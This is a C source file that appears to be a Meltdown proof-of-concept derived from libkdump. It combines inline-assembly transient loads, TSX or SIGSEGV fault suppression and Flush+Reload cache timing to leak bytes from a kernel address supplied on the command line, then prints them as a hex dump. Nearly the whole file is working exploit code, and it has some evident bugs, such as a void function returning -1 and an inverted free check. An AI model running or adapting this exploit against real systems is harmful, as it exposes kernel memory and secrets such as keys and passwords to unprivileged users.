#include <cpuid.h>
#include <errno.h>
#include <fcntl.h>
#include <memory.h>
#include <pthread.h>
#include <sched.h>
#include <setjmp.h>
#include <signal.h>
#include <stdarg.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>
#include <stdio.h>
 
  
int cache_miss_threshold = 0;
int number_retries = 100;
int accept_after = 1; // How many measurements must be the same to accept the read value
int measurements = 3; // Number of measurements to perform for one address
static char *_mem = NULL, *mem = NULL; // used to flush-reload
static size_t phys = 0; // target address, should be virtual address?
static int dbg = 0;

static jmp_buf buf;

#define _XBEGIN_STARTED (~0u)

// ---------------------------------------------------------------------------
#define meltdown                                                               \
  asm volatile("1:\n"                                                          \
               "movq (%%rsi), %%rsi\n"                                         \
               "movzx (%%rcx), %%rax\n"                                         \
               "shl $12, %%rax\n"                                              \
               "jz 1b\n"                                                       \
               "movq (%%rbx,%%rax,1), %%rbx\n"                                 \
               :                                                               \
               : "c"(phys), "b"(mem), "S"(0)                                   \
               : "rax");

// ---------------------------------------------------------------------------
#define meltdown_nonull                                                        \
  asm volatile("1:\n"                                                          \
               "movzx (%%rcx), %%rax\n"                                         \
               "shl $12, %%rax\n"                                              \
               "jz 1b\n"                                                       \
               "movq (%%rbx,%%rax,1), %%rbx\n"                                 \
               :                                                               \
               : "c"(phys), "b"(mem)                                           \
               : "rax");

// ---------------------------------------------------------------------------
#define meltdown_fast                                                          \
  asm volatile("movzx (%%rcx), %%rax\n"                                         \
               "shl $12, %%rax\n"                                              \
               "movq (%%rbx,%%rax,1), %%rbx\n"                                 \
               :                                                               \
               : "c"(phys), "b"(mem)                                           \
               : "rax");
               
               
#define MELTDOWN meltdown_nonull 
// tsx + meltdown/meltdown_nonull/meltdown_fast
// signal+

// ---------------------------------------------------------------------------
typedef enum { ERROR, INFO, SUCCESS } d_sym_t;

// ---------------------------------------------------------------------------
static void debug(d_sym_t symbol, const char *fmt, ...) {
  if (!dbg)
    return;

  switch (symbol) {
  case ERROR:
    printf("\x1b[31;1m[-]\x1b[0m ");
    break;
  case INFO:
    printf("\x1b[33;1m[.]\x1b[0m ");
    break;
  case SUCCESS:
    printf("\x1b[32;1m[+]\x1b[0m ");
    break;
  default:
    break;
  }
  va_list ap;
  va_start(ap, fmt);
  vfprintf(stdout, fmt, ap);
  va_end(ap);
}

// ---------------------------------------------------------------------------
static inline uint64_t rdtsc() {
  uint64_t a = 0, d = 0;
  asm volatile("mfence");
  asm volatile("rdtscp" : "=a"(a), "=d"(d) :: "rcx");

  a = (d << 32) | a;
  asm volatile("mfence");
  return a;
}

// ---------------------------------------------------------------------------
static inline void maccess(void *p) {
  asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax");
}

// ---------------------------------------------------------------------------
static void flush(void *p) {
  asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax");
}

// ---------------------------------------------------------------------------
static int __attribute__((always_inline)) flush_reload(void *ptr) {
  uint64_t start = 0, end = 0;

  start = rdtsc();
  maccess(ptr);
  end = rdtsc();

  flush(ptr);

  if (end - start < cache_miss_threshold) {
    return 1;
  }
  return 0;
}

static __attribute__((always_inline)) inline unsigned int xbegin(void) {
  unsigned status;
  //asm volatile("xbegin 1f \n 1:" : "=a"(status) : "a"(-1UL) : "memory");
  asm volatile(".byte 0xc7,0xf8,0x00,0x00,0x00,0x00" : "=a"(status) : "a"(-1UL) : "memory");
  return status;
}

// ---------------------------------------------------------------------------
static __attribute__((always_inline)) inline void xend(void) {
  //asm volatile("xend" ::: "memory");
  asm volatile(".byte 0x0f; .byte 0x01; .byte 0xd5" ::: "memory");
}

// ---------------------------------------------------------------------------
static void unblock_signal(int signum __attribute__((__unused__))) {
  sigset_t sigs;
  sigemptyset(&sigs);
  sigaddset(&sigs, signum);
  sigprocmask(SIG_UNBLOCK, &sigs, NULL);
}

// ---------------------------------------------------------------------------
static void segfault_handler(int signum) {
  (void)signum;
  unblock_signal(SIGSEGV);
  longjmp(buf, 1);
}

// ---------------------------------------------------------------------------
static void detect_flush_reload_threshold() {
  size_t reload_time = 0, flush_reload_time = 0, i, count = 1000000;
  size_t dummy[16];
  size_t *ptr = dummy + 8;
  uint64_t start = 0, end = 0;

  maccess(ptr);
  for (i = 0; i < count; i++) {
    start = rdtsc();
    maccess(ptr);
    end = rdtsc();
    reload_time += (end - start);
  }
  for (i = 0; i < count; i++) {
    start = rdtsc();
    maccess(ptr);
    end = rdtsc();
    flush(ptr);
    flush_reload_time += (end - start);
  }
  reload_time /= count;
  flush_reload_time /= count;

  debug(INFO, "Flush+Reload: %zd cycles, Reload only: %zd cycles\n",
        flush_reload_time, reload_time);
  cache_miss_threshold = (flush_reload_time + reload_time * 2) / 3;
  debug(SUCCESS, "Flush+Reload threshold: %zd cycles\n",
        cache_miss_threshold);
}

void clean()
{
  if (!_mem) free(_mem);
}

void config()
{
  int j;
  detect_flush_reload_threshold();
  
  _mem = malloc(4096 * 300);
  if (!_mem) {
    errno = ENOMEM;
    return -1;
  }
  mem = (char *)(((size_t)_mem & ~0xfff) + 0x1000 * 2);
  memset(mem, 0xab, 4096 * 290);

  for (j = 0; j < 256; j++) {
    flush(mem + j * 4096);
  }
  
  if (signal(SIGSEGV, segfault_handler) == SIG_ERR) {
      debug(ERROR, "Failed to setup signal handler\n");
      clean();
      return -1;
  }
}

// ---------------------------------------------------------------------------
static int __attribute__((always_inline)) read_value() {
  int i, hit = 0;
  for (i = 0; i < 256; i++) {
    if (flush_reload(mem + i * 4096)) {
      hit = i + 1;
    }
    sched_yield();
  }
  return hit - 1;
}

// ---------------------------------------------------------------------------
int __attribute__((optimize("-Os"), noinline)) libkdump_read_tsx() {
  uint64_t start = 0, end = 0;
  int retries = number_retries;
  while (retries--) {
    if (xbegin() == _XBEGIN_STARTED) {
      MELTDOWN;
      xend();
    }
    int i;
    for (i = 0; i < 256; i++) {
      if (flush_reload(mem + i * 4096)) {
        if (i >= 1) {
          return i;
        }
      }
      sched_yield();
    }
    sched_yield();
  }
  return 0;
}

// ---------------------------------------------------------------------------
int __attribute__((optimize("-Os"), noinline)) libkdump_read_signal_handler() {
  uint64_t start = 0, end = 0;
  int retries = number_retries;
  
  while (retries--) {
    if (!setjmp(buf)) {
      MELTDOWN;
    }
    
    int i;
    for (i = 0; i < 256; i++) {
      if (flush_reload(mem + i * 4096)) {
        if (i >= 1) {
          return i;
        }
      }
      sched_yield();
    }
    sched_yield();
  }
  return 0;
}

// ---------------------------------------------------------------------------
int __attribute__((optimize("-O0"))) libkdump_read(size_t addr) {
  phys = addr;

  char res_stat[256];
  int i, j, r;
  for (i = 0; i < 256; i++)
    res_stat[i] = 0;

  sched_yield();

  for (i = 0; i < measurements; i++) {
  //    r = libkdump_read_tsx();
      r = libkdump_read_signal_handler();
    res_stat[r]++;
  }

  int max_v = 0, max_i = 0;

  if (dbg) {
    for (i = 0; i < sizeof(res_stat); i++) {
      if (res_stat[i] == 0)
        continue;
      debug(INFO, "res_stat[%x] = %d\n",
            i, res_stat[i]);
    }
  }

  for (i = 1; i < 256; i++) {
    if (res_stat[i] > max_v && res_stat[i] >= accept_after) {
      max_v = res_stat[i];
      max_i = i;
    }
  }

  return max_i;
}

void dump_hex(void* addr, const void* data, size_t size) {
	char ascii[17];
	size_t i, j;
	ascii[16] = '\0';
   printf("0x%016lx | ", (unsigned long)addr);
	for (i = 0; i < size; ++i) {
		printf("%02X ", ((unsigned char*)data)[i]);
		if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
			ascii[i % 16] = ((unsigned char*)data)[i];
		} else {
			ascii[i % 16] = '.';
		}
		if ((i+1) % 8 == 0 || i+1 == size) {
			printf(" ");
			if ((i+1) % 16 == 0) {
				printf("|  %s \n", ascii);
			} else if (i+1 == size) {
				ascii[(i+1) % 16] = '\0';
				if ((i+1) % 16 <= 8) {
					printf(" ");
				}
				for (j = (i+1) % 16; j < 16; ++j) {
					printf("   ");
				}
				printf("|  %s \n", ascii);
			}
		}
	}
}

int usage(void)
{
	printf("meltdown: [hexaddr] [size]\n");
	return 2;
}

int main(int argc, char** argv)
{
  config();
  size_t start_addr;
  size_t len;
  int t; unsigned char read_buf[16];
  
  char *progname = argv[0];
	 if (argc < 3)
		 return usage();

	 if (sscanf(argv[1], "%lx", &start_addr) != 1)
		 return usage();

	 if (sscanf(argv[2], "%lx", &len) != 1)
		 return usage();
    
   int fd = open("/proc/version", O_RDONLY);
	 if (fd < 0) {
	 	 perror("open");
		 return -1;
	 }
  
  for(t = 0; t < len; t++)
  {
    if (t > 0 && 0 == t%16) {
      dump_hex((void*)(start_addr + t - 16), read_buf, 16);
    }
    
    int ret = pread(fd, buf, sizeof(buf), 0);
      if (ret < 0) {
  	    perror("pread");
        return -1;
    }
        
    read_buf[t%16] = libkdump_read(start_addr+t);
//    printf("result: %d\n", libkdump_read(start_addr+t));
  }
  
  if (t > 0) {
      dump_hex((void*)(start_addr + ((t%16 ? t : (t-1))/16) * 16),
         read_buf, t%16 ? t%16 : 16);
   }
}